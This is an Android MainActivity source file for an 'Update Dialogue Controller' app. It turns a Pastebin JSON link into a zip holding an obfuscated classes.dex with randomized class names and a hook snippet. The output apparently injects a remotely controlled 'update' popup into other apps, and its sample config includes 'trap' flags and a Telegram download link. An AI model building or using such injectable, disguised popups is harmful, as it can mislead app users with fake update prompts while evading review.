package com.error.updatedialogue;

import android.Manifest;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private EditText urlInput;
    private EditText nameInput;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setBackgroundColor(Color.parseColor("#F5F7FA"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.TOP);
        int pad = dp(24);
        root.setPadding(pad, pad, pad, pad);
        scrollView.addView(root);

        // Header Title
        TextView header = new TextView(this);
        header.setText("Update Dialogue Controller");
        header.setTextSize(TypedValue.COMPLEX_UNIT_SP, 24);
        header.setTypeface(Typeface.DEFAULT_BOLD);
        header.setTextColor(Color.parseColor("#111827"));
        header.setGravity(Gravity.CENTER);
        header.setPadding(0, dp(12), 0, dp(8));
        root.addView(header);

        // Subtitle
        TextView subtitle = new TextView(this);
        subtitle.setText("Paste your Pastebin raw JSON link below, test it, then Generate a locked output zip.");
        subtitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f);
        subtitle.setTextColor(Color.parseColor("#6B7280"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, dp(24));
        root.addView(subtitle);

        // Card container for URL Input
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        int cardPad = dp(20);
        card.setPadding(cardPad, cardPad, cardPad, cardPad);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(dp(20));
        cardBg.setStroke(dp(1), Color.parseColor("#E5E7EB"));
        card.setBackground(cardBg);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            card.setElevation(dp(6));
        }

        TextView inputLabel = new TextView(this);
        inputLabel.setText("Remote Pastebin / JSON URL:");
        inputLabel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        inputLabel.setTypeface(Typeface.DEFAULT_BOLD);
        inputLabel.setTextColor(Color.parseColor("#374151"));
        inputLabel.setPadding(0, 0, 0, dp(8));
        card.addView(inputLabel);

        // Editable remote JSON URL (saved for convenience)
        urlInput = new EditText(this);
        urlInput.setText(getSharedPreferences("controller", Context.MODE_PRIVATE)
                .getString("saved_url", "https://pastebin.com/raw/YJVbZS65"));
        urlInput.setHint("https://pastebin.com/raw/...");
        urlInput.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f);
        urlInput.setTextColor(Color.parseColor("#111827"));
        urlInput.setSingleLine(false);
        urlInput.setMaxLines(3);
        int editPad = dp(14);
        urlInput.setPadding(editPad, editPad, editPad, editPad);

        GradientDrawable editBg = new GradientDrawable();
        editBg.setColor(Color.parseColor("#F9FAFB"));
        editBg.setCornerRadius(dp(12));
        editBg.setStroke(dp(1), Color.parseColor("#D1D5DB"));
        urlInput.setBackground(editBg);
        card.addView(urlInput);

        TextView nameLabel = new TextView(this);
        nameLabel.setText("Output Zip Name:");
        nameLabel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        nameLabel.setTypeface(Typeface.DEFAULT_BOLD);
        nameLabel.setTextColor(Color.parseColor("#374151"));
        nameLabel.setPadding(0, dp(16), 0, dp(8));
        card.addView(nameLabel);

        nameInput = new EditText(this);
        nameInput.setText(getSharedPreferences("controller", Context.MODE_PRIVATE)
                .getString("saved_name", "Update Dialogue"));
        nameInput.setHint("Update Dialogue");
        nameInput.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f);
        nameInput.setTextColor(Color.parseColor("#111827"));
        nameInput.setSingleLine(true);
        nameInput.setPadding(editPad, editPad, editPad, editPad);
        GradientDrawable nameBg = new GradientDrawable();
        nameBg.setColor(Color.parseColor("#F9FAFB"));
        nameBg.setCornerRadius(dp(12));
        nameBg.setStroke(dp(1), Color.parseColor("#D1D5DB"));
        nameInput.setBackground(nameBg);
        card.addView(nameInput);

        // Save & Test Remote Button
        Button saveBtn = new Button(this);
        saveBtn.setText("Save & Test Remote Dialogue");
        saveBtn.setTextColor(Color.WHITE);
        saveBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        saveBtn.setTypeface(Typeface.DEFAULT_BOLD);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            saveBtn.setStateListAnimator(null);
        }

        GradientDrawable saveBg = new GradientDrawable();
        saveBg.setColor(Color.parseColor("#111827"));
        saveBg.setCornerRadius(dp(12));
        saveBtn.setBackground(saveBg);

        LinearLayout.LayoutParams btnParams1 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(48));
        btnParams1.topMargin = dp(16);
        saveBtn.setLayoutParams(btnParams1);

        saveBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String enteredUrl = normalizeRemoteUrl(urlInput.getText().toString());
                if (!isValidUrl(enteredUrl)) {
                    Toast.makeText(MainActivity.this, "Please enter a valid https URL", Toast.LENGTH_SHORT).show();
                    return;
                }
                urlInput.setText(enteredUrl);
                saveInputs();
                Toast.makeText(MainActivity.this, "Fetching...", Toast.LENGTH_SHORT).show();
                // GENERATED-CALL:TEST:START
                platform.config.WindowManager.preview(MainActivity.this, enteredUrl);
                // GENERATED-CALL:TEST:END
            }
        });
        card.addView(saveBtn);

        // Preview Offline Button
        Button previewBtn = new Button(this);
        previewBtn.setText("Preview Dialogue Directly (Offline)");
        previewBtn.setTextColor(Color.parseColor("#374151"));
        previewBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f);
        previewBtn.setTypeface(Typeface.DEFAULT_BOLD);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            previewBtn.setStateListAnimator(null);
        }

        GradientDrawable prevBg = new GradientDrawable();
        prevBg.setColor(Color.parseColor("#E5E7EB"));
        prevBg.setCornerRadius(dp(12));
        previewBtn.setBackground(prevBg);

        LinearLayout.LayoutParams btnParams2 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(46));
        btnParams2.topMargin = dp(10);
        previewBtn.setLayoutParams(btnParams2);

        previewBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // GENERATED-CALL:PREVIEW:START
                platform.config.WindowManager.applySample(MainActivity.this);
                // GENERATED-CALL:PREVIEW:END
            }
        });
        card.addView(previewBtn);

        // Generate Output Zip Button
        Button generateBtn = new Button(this);
        generateBtn.setText("Generate Output Zip");
        generateBtn.setTextColor(Color.WHITE);
        generateBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        generateBtn.setTypeface(Typeface.DEFAULT_BOLD);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            generateBtn.setStateListAnimator(null);
        }

        GradientDrawable generateBg = new GradientDrawable();
        generateBg.setColor(Color.parseColor("#2563EB"));
        generateBg.setCornerRadius(dp(12));
        generateBtn.setBackground(generateBg);

        LinearLayout.LayoutParams btnParams3 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(48));
        btnParams3.topMargin = dp(10);
        generateBtn.setLayoutParams(btnParams3);

        generateBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                generateOutputZip();
            }
        });
        card.addView(generateBtn);

        root.addView(card);

        // JSON Guide Card
        LinearLayout guideCard = new LinearLayout(this);
        guideCard.setOrientation(LinearLayout.VERTICAL);
        int guidePad = dp(16);
        guideCard.setPadding(guidePad, guidePad, guidePad, guidePad);

        GradientDrawable guideBg = new GradientDrawable();
        guideBg.setColor(Color.WHITE);
        guideBg.setCornerRadius(dp(16));
        guideBg.setStroke(dp(1), Color.parseColor("#E5E7EB"));
        guideCard.setBackground(guideBg);

        LinearLayout.LayoutParams guideParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        guideParams.topMargin = dp(20);
        guideCard.setLayoutParams(guideParams);

        TextView guideTitle = new TextView(this);
        guideTitle.setText("Pastebin JSON Structure (tap JSON to copy):");
        guideTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        guideTitle.setTypeface(Typeface.DEFAULT_BOLD);
        guideTitle.setTextColor(Color.parseColor("#1F2937"));
        guideCard.addView(guideTitle);

        TextView jsonCode = new TextView(this);
        jsonCode.setText("{\n" +
                "  \"isVisible\": true,\n" +
                "  \"title\": \"New Update!\",\n" +
                "  \"message\": \"Version 2.0 is available.\",\n" +
                "  \"updateUrl\": \"https://t.me/errordrive\",\n" +
                "  \"buttonText\": \"DOWNLOAD\",\n" +
                "  \"trap_active\": true,\n" +
                "  \"trap_enabled\": true\n" +
                "}");
        jsonCode.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        jsonCode.setTypeface(Typeface.MONOSPACE);
        jsonCode.setTextColor(Color.parseColor("#4B5563"));
        jsonCode.setPadding(dp(8), dp(8), dp(8), dp(8));

        GradientDrawable codeBg = new GradientDrawable();
        codeBg.setColor(Color.parseColor("#F3F4F6"));
        codeBg.setCornerRadius(dp(8));
        jsonCode.setBackground(codeBg);

        LinearLayout.LayoutParams codeParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        codeParams.topMargin = dp(8);
        jsonCode.setLayoutParams(codeParams);
        guideCard.addView(jsonCode);

        jsonCode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ClipboardManager clipboard = (ClipboardManager)
                        getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null) {
                    clipboard.setPrimaryClip(ClipData.newPlainText(
                            "json", jsonCode.getText().toString()));
                    Toast.makeText(MainActivity.this, "JSON copied", Toast.LENGTH_SHORT).show();
                }
            }
        });

        root.addView(guideCard);

        setContentView(scrollView);

        // GENERATED-CALL:STARTUP:START
        platform.config.WindowManager.start(this);
        // GENERATED-CALL:STARTUP:END
    }

    /**
     * Generates a fresh output zip on-device. Every click builds a new
     * locked-link blob for the entered URL and rewrites the template dex
     * with fresh randomized class names, then writes only classes.dex +
     * mainactivity-call.txt into /storage/emulated/0/Update Dialogue/.
     */
    private void generateOutputZip() {
        final String enteredUrl = normalizeRemoteUrl(urlInput.getText().toString());
        if (!isValidUrl(enteredUrl)) {
            Toast.makeText(this, "Please enter a valid https URL", Toast.LENGTH_SHORT).show();
            return;
        }
        urlInput.setText(enteredUrl);
        final String zipFileName = sanitizeZipBaseName(nameInput.getText().toString()) + ".zip";
        saveInputs();
        if (!ensureStorageAccess()) {
            return;
        }

        // GENERATED-CALL:EXPORT:START
        String entryClass = "platform.config.WindowManager";
        String entryMethod = "start";
        // GENERATED-CALL:EXPORT:END

        final String bridgeClass = entryClass;
        final String bridgeMethod = entryMethod;
        Toast.makeText(this, "Generating...", Toast.LENGTH_SHORT).show();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    DexGenerator.Result result = DexGenerator.generate(
                            MainActivity.this, enteredUrl, bridgeClass, bridgeMethod);
                    final String savedLabel = writeZipToStorage(result, zipFileName);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this,
                                    "Saved: " + savedLabel, Toast.LENGTH_LONG).show();
                        }
                    });
                } catch (final Exception e) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            String message = e.getMessage();
                            Toast.makeText(MainActivity.this,
                                    "Generate failed: " + (message == null ? e.toString() : message),
                                    Toast.LENGTH_LONG).show();
                        }
                    });
                }
            }
        }).start();
    }

    private boolean ensureStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                return true;
            }
            try {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } catch (Exception e) {
                try {
                    startActivity(new Intent(
                            Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
                } catch (Exception ignored) {
                }
            }
            Toast.makeText(this,
                    "All files access allow kore abar Generate click koro",
                    Toast.LENGTH_LONG).show();
            return false;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && Build.VERSION.SDK_INT <= Build.VERSION_CODES.P
                && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1001);
            Toast.makeText(this,
                    "Storage permission allow kore abar Generate click koro",
                    Toast.LENGTH_LONG).show();
            return false;
        }
        return true;
    }

    private boolean canWriteDirectRoot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            return false;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private String writeZipToStorage(DexGenerator.Result result, String zipFileName)
            throws Exception {
        if (canWriteDirectRoot()) {
            File dir = new File(Environment.getExternalStorageDirectory(), "Update Dialogue");
            if (!dir.exists() && !dir.mkdirs()) {
                throw new IllegalStateException("Could not create output folder");
            }
            File file = new File(dir, zipFileName);
            OutputStream out = new FileOutputStream(file);
            try {
                writeOutputZip(out, result);
            } finally {
                out.close();
            }
            return file.getAbsolutePath();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContentValues values = new ContentValues();
            values.put(MediaStore.Downloads.DISPLAY_NAME, zipFileName);
            values.put(MediaStore.Downloads.MIME_TYPE, "application/zip");
            values.put(MediaStore.Downloads.RELATIVE_PATH,
                    Environment.DIRECTORY_DOWNLOADS + "/Update Dialogue");
            values.put(MediaStore.Downloads.IS_PENDING, 1);
            Uri uri = getContentResolver().insert(
                    MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
            if (uri == null) {
                throw new IllegalStateException("Could not create output file");
            }
            OutputStream out = getContentResolver().openOutputStream(uri);
            if (out == null) {
                throw new IllegalStateException("Could not open output file");
            }
            try {
                writeOutputZip(out, result);
            } finally {
                out.close();
            }
            values.clear();
            values.put(MediaStore.Downloads.IS_PENDING, 0);
            getContentResolver().update(uri, values, null, null);
            return "/storage/emulated/0/Download/Update Dialogue/" + zipFileName;
        }

        File dir = new File(getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS),
                "Update Dialogue");
        if (!dir.exists() && !dir.mkdirs()) {
            throw new IllegalStateException("Could not create output folder");
        }
        File file = new File(dir, zipFileName);
        OutputStream out = new FileOutputStream(file);
        try {
            writeOutputZip(out, result);
        } finally {
            out.close();
        }
        return file.getAbsolutePath();
    }

    private void writeOutputZip(OutputStream out, DexGenerator.Result result) throws Exception {
        ZipOutputStream zip = new ZipOutputStream(out);
        try {
            zip.putNextEntry(new ZipEntry("classes.dex"));
            InputStream dex = new FileInputStream(result.dexFile);
            try {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = dex.read(buffer)) != -1) {
                    zip.write(buffer, 0, read);
                }
            } finally {
                dex.close();
            }
            zip.closeEntry();

            zip.putNextEntry(new ZipEntry("mainactivity-call.txt"));
            zip.write(result.hookText.getBytes(StandardCharsets.UTF_8));
            zip.closeEntry();
        } finally {
            zip.close();
        }
    }

    private String normalizeRemoteUrl(String value) {
        if (value == null) {
            return "";
        }
        String url = value.trim();
        try {
            Uri uri = Uri.parse(url);
            String host = uri.getHost();
            if (host != null && "pastebin.com".equalsIgnoreCase(host)) {
                String path = uri.getPath();
                if (path == null) {
                    path = "";
                }
                if (!path.startsWith("/raw/")) {
                    String id = path.replaceAll("^/+", "");
                    int slash = id.indexOf('/');
                    if (slash >= 0) {
                        id = id.substring(0, slash);
                    }
                    if (!id.isEmpty()) {
                        return "https://pastebin.com/raw/" + id;
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        return url;
    }

    private boolean isValidUrl(String value) {
        if (value == null) {
            return false;
        }
        Uri uri = Uri.parse(value.trim());
        return "https".equalsIgnoreCase(uri.getScheme())
                && uri.getHost() != null
                && !uri.getHost().isEmpty();
    }

    private void saveInputs() {
        getSharedPreferences("controller", Context.MODE_PRIVATE)
                .edit()
                .putString("saved_url", normalizeRemoteUrl(urlInput.getText().toString()))
                .putString("saved_name", nameInput.getText().toString().trim())
                .apply();
    }

    private String sanitizeZipBaseName(String value) {
        String name = value == null ? "" : value.trim();
        if (name.toLowerCase().endsWith(".zip")) {
            name = name.substring(0, name.length() - 4).trim();
        }
        name = name.replaceAll("[\\\\/:*?\"<>|\\p{Cntrl}]", " ")
                .replaceAll("\\s+", " ")
                .trim();
        if (name.isEmpty() || ".".equals(name) || "..".equals(name)) {
            name = "Update Dialogue";
        }
        if (name.length() > 60) {
            name = name.substring(0, 60).trim();
        }
        return name;
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP,
                value,
                getResources().getDisplayMetrics()
        );
    }

    @Override
    protected void onDestroy() {
        // GENERATED-CALL:TEARDOWN:START
        platform.config.WindowManager.unbind();
        // GENERATED-CALL:TEARDOWN:END
        super.onDestroy();
    }
}
